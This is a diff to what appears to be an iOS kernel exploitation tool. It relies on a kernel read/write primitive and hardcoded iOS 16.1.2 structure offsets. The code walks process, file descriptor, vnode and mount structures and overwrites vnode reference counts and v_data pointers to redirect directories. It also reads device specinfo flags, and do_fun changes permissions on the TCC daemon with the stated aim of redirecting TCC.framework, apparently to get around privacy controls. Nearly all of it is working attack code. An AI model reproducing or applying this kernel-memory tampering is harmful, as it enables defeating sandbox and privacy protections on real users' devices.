@@ -167,8 +167,9 @@ int funUcred(u64 kfd, uint64_t proc) {
     uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
     uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
     printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
-    
-//    printf("[i] self ucred->cr_label+0x8: 0x%llx\n", kread64(kfd, cr_label+0x8));
+//
+//    printf("[i] self ucred->cr_label+0x8+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, cr_label+0x8)));
+//    printf("[i] self ucred->cr_label+0x8+0x0+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, kread64(kfd, cr_label+0x8))));
 //    printf("[i] self ucred->cr_label+0x10: 0x%llx\n", kread64(kfd, cr_label+0x10));
 //    uint64_t OSEntitlements = kread64(kfd, cr_label+0x10);
 //    printf("OSEntitlements: 0x%llx\n", OSEntitlements);
@@ -408,7 +409,59 @@ int funTask(u64 kfd, char* process) {
     return 0;
 }
 
-uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
+uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_vnode_v_kusecount = 0x5c;
+    uint32_t off_vnode_v_references = 0x5b;
+    
+    int file_index = open(to, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    
+    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
+    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
+    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
+    
+    close(file_index);
+    
+    file_index = open(from, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    filedesc = filedesc_pac | 0xffffff8000000000;
+    openedfile = kread64(kfd, filedesc + (8 * file_index));
+    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    fileglob = fileglob_pac | 0xffffff8000000000;
+    vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
+    
+    close(file_index);
+    
+    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
+    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
+    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
+    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
+    
+    return 0;
+}
+
+uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
     uint32_t off_fd_ofiles = 0;
@@ -417,6 +470,7 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     uint32_t off_vnode_iocount = 0x64;
     uint32_t off_vnode_usecount = 0x60;
     uint32_t off_vnode_vflags = 0x54;
+    uint32_t off_vnode_v_name = 0xb8;
     uint32_t off_vnode_v_mount = 0xd8;
     uint32_t off_vnode_v_data = 0xe0;
     uint32_t off_vnode_v_kusecount = 0x5c;
@@ -424,9 +478,16 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     uint32_t off_vnode_v_parent = 0xc0;
     uint32_t off_vnode_v_label = 0xe8;
     uint32_t off_vnode_v_cred = 0x98;
+    uint32_t off_vnode_vu_mountedhere = 0x68;
+    uint32_t off_vnode_vu_socket = 0x70;
+    uint32_t off_vnode_vu_specinfo = 0x78;
+    uint32_t off_vnode_vu_fifoinfo = 0x80;
+    uint32_t off_vnode_vu_ubcinfo = 0x88;
     uint32_t off_mount_mnt_data = 0x11F;
     uint32_t off_mount_mnt_fsowner = 0x9c0;
     uint32_t off_mount_mnt_fsgroup = 0x9c4;
+    uint32_t off_mount_mnt_devvp = 0x980;
+    uint32_t off_specinfo_si_flags = 0x10;
     
     int file_index = open(to, O_RDONLY);
     if (file_index == -1) return -1;
@@ -484,11 +545,16 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     uint64_t to_v_cred = to_v_cred_pac | 0xffffff8000000000;
     printf("[i] %s to_vnode->v_cred: 0x%llx\n", to, to_v_cred);
     
-    uint32_t to_m_fsowner = kread32(kfd, to_v_mount + off_mount_mnt_fsowner);
-    printf("[i] %s to_vnode->v_mount->mnt_fsowner: %d\n", to, to_m_fsowner);
-    uint32_t to_m_fsgroup = kread32(kfd, to_v_mount + off_mount_mnt_fsgroup);
-    printf("[i] %s to_vnode->v_mount->mnt_fsgroup: %d\n", to, to_m_fsgroup);
-    
+    uint64_t to_devvp = kread64(kfd, to_v_mount + off_mount_mnt_devvp);
+    printf("[i] %s to_vnode->v_mount->mnt_devvp: 0x%llx\n", to, to_devvp);
+    uint64_t to_devvp_nameptr = kread64(kfd, to_devvp + off_vnode_v_name);
+    uint64_t to_devvp_name = kread64(kfd, to_devvp_nameptr);
+    printf("[i] %s to_vnode->v_mount->mnt_devvp->v_name: %s\n", to, &to_devvp_name);
+    uint64_t to_devvp_vu_specinfo_pac = kread64(kfd, to_devvp + off_vnode_vu_specinfo);
+    uint64_t to_devvp_vu_specinfo = to_devvp_vu_specinfo_pac | 0xffffff8000000000;
+    printf("[i] %s to_devvp->vu_specinfo: 0x%llx\n", to, to_devvp_vu_specinfo);
+    uint32_t to_devvp_vu_specinfo_si_flags = kread32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags);
+    printf("[i] %s to_devvp->vu_specinfo->si_flags: 0x%x\n", to, to_devvp_vu_specinfo_si_flags);
     
     close(file_index);
     
@@ -504,8 +570,6 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
-    
-    
     
     uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
     uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
@@ -547,151 +611,38 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
     
+    uint64_t from_devvp = kread64(kfd, from_v_mount + off_mount_mnt_devvp);
+    printf("[i] %s from_vnode->v_mount->mnt_devvp: 0x%llx\n", from, from_devvp);
+    uint64_t from_devvp_nameptr = kread64(kfd, from_devvp + off_vnode_v_name);
+    uint64_t from_devvp_name = kread64(kfd, from_devvp_nameptr);
+    printf("[i] %s from_vnode->v_mount->mnt_devvp->v_name: %s\n", from, &from_devvp_name);
+    uint64_t from_devvp_vu_specinfo_pac = kread64(kfd, from_devvp + off_vnode_vu_specinfo);
+    uint64_t from_devvp_vu_specinfo = from_devvp_vu_specinfo_pac | 0xffffff8000000000;
+    printf("[i] %s from_devvp->vu_specinfo: 0x%llx\n", from, from_devvp_vu_specinfo);
+    uint32_t from_devvp_vu_specinfo_si_flags = kread32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags);
+    printf("[i] %s from_devvp->vu_specinfo->si_flags: 0x%x\n", from, from_devvp_vu_specinfo_si_flags);
+    
+//#define VFMLINKTARGET  0x20000000
+//    kwrite32(kfd, from_vnode + off_vnode_vflags, kread32(kfd, from_vnode + off_vnode_vflags) & VFMLINKTARGET);
+//
+//    kwrite32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
+//    kwrite32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
+    
+//    kwrite64(kfd, to_v_mount + off_mount_mnt_devvp, from_devvp);
+//    kwrite64(kfd, to_v_mount + off_mount_mnt_data, kread64(kfd, from_v_mount + off_mount_mnt_data));
+    
+//    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
+//    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
+//    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
+//    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, to_devvp + off_vnode_v_data));
+//
 //    close(file_index);
     
-    sleep(2);
-    
-    //mnt_devvp
-    kwrite64(kfd, to_v_mount + 0x980, kread64(kfd, from_v_mount + 0x980));
-    //mnt_data
-//    kwrite64(kfd, to_v_mount + 0x8f8, kread64(kfd, from_v_mount + 0x8f8));
-    //mnt_kern_flag
-    kwrite32(kfd, to_v_mount + 0x74, kread32(kfd, from_v_mount + 0x74));
-    //mnt_vfsstat
-    uint64_t from_m_vfsstat = from_v_mount + 0x84;
-    uint64_t to_m_vfsstat = to_v_mount + 0x84;
-    kwrite32(kfd, to_m_vfsstat, kread32(kfd, from_m_vfsstat));
-    kwrite32(kfd, to_m_vfsstat + 0x4, kread32(kfd, from_m_vfsstat + 0x4));
-    kwrite64(kfd, to_m_vfsstat + 0x8, kread32(kfd, from_m_vfsstat + 0x8));
-    kwrite64(kfd, to_m_vfsstat + 0x10, kread32(kfd, from_m_vfsstat + 0x10));
-    kwrite64(kfd, to_m_vfsstat + 0x18, kread32(kfd, from_m_vfsstat + 0x18));
-    kwrite64(kfd, to_m_vfsstat + 0x20, kread32(kfd, from_m_vfsstat + 0x20));
-    kwrite64(kfd, to_m_vfsstat + 0x28, kread32(kfd, from_m_vfsstat + 0x28));
-    kwrite64(kfd, to_m_vfsstat + 0x30, kread32(kfd, from_m_vfsstat + 0x30));
-    
-    //mnt_flag
-    uint32_t from_m_flag = kread32(kfd, from_v_mount + 0x70);
-    uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
-    
-    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
-    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
-    
-#define VISHARDLINK     0x100000
-#define MNT_RDONLY      0x00000001
-    kwrite32(kfd, to_vnode+off_vnode_vflags, kread32(kfd, to_vnode+off_vnode_vflags) & (~(0x1<<6)));
-//    kwrite32(kfd, to_v_mount + 0x70, to_m_flag & (~(0x1<<6)));
-    
-    printf("from_m_flag: 0x%x, to_m_flag: 0x%lx\n", from_m_flag, to_m_flag);
-    
-    
-//    uint32_t* p_bsize = (uint32_t*)((uintptr_t)&vfs + 0);
-//        size_t* p_iosize = (size_t*)((uintptr_t)&vfs + 4);
-//        uint64_t* p_blocks = (uint64_t*)((uintptr_t)&vfs + 8);
-//        uint64_t* p_bfree = (uint64_t*)((uintptr_t)&vfs + 16);
-//        uint64_t* p_bavail = (uint64_t*)((uintptr_t)&vfs + 24);
-//        uint64_t* p_bused = (uint64_t*)((uintptr_t)&vfs + 32);
-//        uint64_t* p_files = (uint64_t*)((uintptr_t)&vfs + 40);
-//        uint64_t* p_ffree = (uint64_t*)((uintptr_t)&vfs + 48);
-    
-//    kwrite64(kfd, to_vnode + off_vnode_v_data, 0);
-//    sleep(1);
-    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
-//    kwrite64(kfd, to_v_data + 0x10, kread64(kfd, from_v_data + 0x10));
-//    kwrite64(kfd, to_v_data + 0x18, kread64(kfd, from_v_data + 0x18));
-//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data + 0x20));
-//    kwrite64(kfd, to_v_data + 0x30, kread64(kfd, from_v_data + 0x30));
-//    kwrite64(kfd, to_v_data + 0xc0, kread64(kfd, from_v_data + 0xc0));
-//    kwrite64(kfd, to_v_data + 0x130, kread64(kfd, from_v_data + 0x130));
-//    kwrite64(kfd, to_v_data + 0x148, kread64(kfd, from_v_data + 0x148));
-//    kwrite64(kfd, to_v_data + 0x150, kread64(kfd, from_v_data + 0x150));
-//    kwrite64(kfd, to_v_data + 0x1b8, kread64(kfd, from_v_data + 0x1b8));
-//    kwrite64(kfd, to_v_data + 0x1c0, kread64(kfd, from_v_data + 0x1c0));
-//    kwrite64(kfd, to_v_data + 0x1d0, kread64(kfd, from_v_data + 0x1d0));
-    
-//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data+0x20));
-    
-//        kwrite32(kfd, to_vnode + off_vnode_iocount, from_usecount + 1);
-
-    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
-    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
-    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
-
-//        kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
-//        kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
-//        kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
-//        kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
-//        kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
-//        kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
-//        kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);
-    
-    
-//    //v_data = (struct apfs_fsnode, closed-source...)
-//    //    from_fd_vnode = kread64(kfd, from_v_data + 32);
-//    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_fd_vnode);// <- vnode
-
-    return 0;
-}
-
-uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
-    //16.1.2 offsets
-    uint32_t off_p_pfd = 0xf8;
-    uint32_t off_fd_ofiles = 0;
-    uint32_t off_fp_fglob = 0x10;
-    uint32_t off_fg_data = 0x38;
-    uint32_t off_vnode_iocount = 0x64;
-    uint32_t off_vnode_usecount = 0x60;
-    uint32_t off_vnode_vflags = 0x54;
-    uint32_t off_vnode_v_mount = 0xd8;
-    uint32_t off_vnode_v_data = 0xe0;
-    uint32_t off_vnode_v_kusecount = 0x5c;
-    uint32_t off_vnode_v_references = 0x5b;
-    uint32_t off_vnode_v_parent = 0xc0;
-    uint32_t off_vnode_v_label = 0xe8;
-    uint32_t off_vnode_v_cred = 0x98;
-    uint32_t off_mount_mnt_fsowner = 0x9c0;
-    uint32_t off_mount_mnt_fsgroup = 0x9c4;
-    
-    int file_index = open(to, O_RDONLY);
-    if (file_index == -1) return -1;
-    
-    uint64_t proc = getProc(kfd, getpid());
-    
-    //get vnode
-    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
-    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
-    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
-    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
-    
-    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
-    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
-    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
-    
-    close(file_index);
-    
-    file_index = open(from, O_RDONLY);
-    if (file_index == -1) return -1;
-    
-    filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    filedesc = filedesc_pac | 0xffffff8000000000;
-    openedfile = kread64(kfd, filedesc + (8 * file_index));
-    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    fileglob = fileglob_pac | 0xffffff8000000000;
-    vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
-    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
-    
-    close(file_index);
-    
-    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
-    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
-    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
-    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
+//    sleep(2);
     
     return 0;
 }
+
 
 int do_fun(u64 kfd) {
     uint64_t kslide = ((struct kfd*)kfd)->perf.kernel_slide;
@@ -722,14 +673,18 @@ int do_fun(u64 kfd) {
     //Restore
     funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
     
-    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
-    //Current: Redirect /var -> NSHomeDirectory(), @"/Documents/mounted"
+    
+    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
     NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
     [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
     [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
-    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
+//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
     NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
     NSLog(@"/var directory: %@", dirs);
+    
+    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
+    funVnodeResearch(kfd, mntPath.UTF8String, "/System/Library");
+    
     
 //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
 //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
